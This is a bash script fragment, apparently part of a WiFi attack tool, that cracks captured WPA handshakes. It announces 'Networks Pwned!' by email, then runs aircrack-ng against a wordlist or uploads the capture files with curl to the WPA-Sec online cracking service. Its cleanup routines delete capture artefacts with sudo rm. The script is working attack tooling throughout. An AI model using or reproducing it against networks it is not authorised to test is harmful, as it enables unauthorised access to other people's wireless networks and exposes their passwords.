crack () {
    echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email > /dev/null 2>&1
    # Check if there are any .cap files in the current directory
    if ! ls *.cap &>/dev/null; then
        # If no .cap files found, change to /handshakes directory without output
        cd handshakes &>/dev/null
    fi
    crack_hashes
}

crack_hashes() {
    echo "Do you want to crack hashes from your device or from the web?"
    select method in "Local (Device)" "Upload (WPA-Sec)"; do
        case $method in
            "Local (Device)")
                # Local cracking with Hashcat or other methods (you can extend this part)
                echo "You have selected local cracking."
                echo "Your current directory:"
                pwd
                ls *.txt &>/dev/null
                read -p "Enter path to wordlist : " wordlist
                sudo aircrack-ng -w "$wordlist" *.cap
                cleanup_handshakes
                cleanup
                exit
                ;;
            "Upload (WPA-Sec)")
                # Ask for the user's email for cracking (optional, based on the site)
                echo "Please provide your email for WPA-Sec service:"
                read -p "Email: " user_email

                if [[ -z "$user_email" ]]; then
                    echo "Email cannot be empty. Exiting."
                    exit 1
                fi

                # Ask for the path to the .cap file
                echo "Please provide the path to your .cap file:"
                echo "Your current directory:"
                pwd
                ls *.cap
                read -p "Path to .cap file: " cap_file

                # Check if the file exists
                if [[ ! -f "$cap_file" ]]; then
                    echo "File not found. Exiting."
                    exit 1
                fi

                # Ensure user agrees to terms and conditions (optional, based on the site)
                echo "Please agree to the Terms & Conditions by typing 'yes':"
                read agreement

                if [[ "$agreement" != "yes" ]]; then
                    echo "You must agree to the terms to continue. Exiting."
                    exit 1
                fi

                # Read the key from key.txt
                if [[ ! -f "key.txt" ]]; then
                    echo "key.txt file not found. Exiting."
                    exit 1
                fi

                # Get the key from key.txt
                key=$(cat key.txt)

                # Check if the key is empty
                if [[ -z "$key" ]]; then
                    echo "Key in key.txt is empty. Exiting."
                    exit 1
                fi

                # Upload to WPA-Sec
                echo "Uploading $cap_file to WPA-Sec..."
                response=$(curl -s -w "%{http_code}" -X POST "https://wpa-sec.stanev.org/?submit" \
                    -F "email=$user_email" \
                    -F "file=@$cap_file" \
                    -F "key=$key" \
                    -F "submit=Submit")

                # Output the response status code and body for debugging
                echo "Response: $response" 
                echo "This capture is legacy but will still work..."
                echo "Handshakes have been successfully submitted. If a password is found you will receive an email."

                # Check the response to determine if submission was successful
                if [[ "$response" == *"Cracking started"* ]]; then
                    echo "Cracking request submitted successfully."
                else
                    echo "Error submitting your request. Please try again. Response: $response"
                    exit 1
                fi
                break
                ;;
            *)
                echo "Invalid option. Please select either 'Local' or 'Upload'."
                ;;
        esac
    done
}

cleanup () {
    sudo rm -f *.csv > /dev/null 2>&1
    sudo rm -f *.netxml > /dev/null 2>&1
    sudo rm -f airodump_output.log > /dev/null 2>&1
    sudo rm -f *.ivs > /dev/null 2>&1
    sudo rm -f *.hc22000 > /dev/null 2>&1
    sudo rm -f essidlist > /dev/null 2>&1
    cleanup_handshakes
    sudo mv *pcapng /handshakes > /dev/null 2>&1
}


cleanup_handshakes() {
    # Define the directory path explicitly
    local script_dir="/home/superuser/air-script"  # Adjust the path to your actual script location

    # Ensure you're in the correct directory
    if [ ! -d "$script_dir/handshakes" ]; then
        echo "Creating handshakes directory..."
        mkdir -p "$script_dir/handshakes"
    fi

    echo "Renaming and moving .cap files to handshakes folder..."
    # Change to the script directory
    cd "$script_dir" || { echo "Failed to change directory to $script_dir"; exit 1; }

    for cap_file in *.cap; do
        if [ -f "$cap_file" ]; then
            timestamp=$(date +"%Y-%m-%d_%H-%M-%S")
            new_file="handshakes/${timestamp}_$(basename "$cap_file")"
            mv "$cap_file" "$new_file"
        fi
    done

    echo "Cleanup complete. All .cap files renamed and moved to handshakes."
}
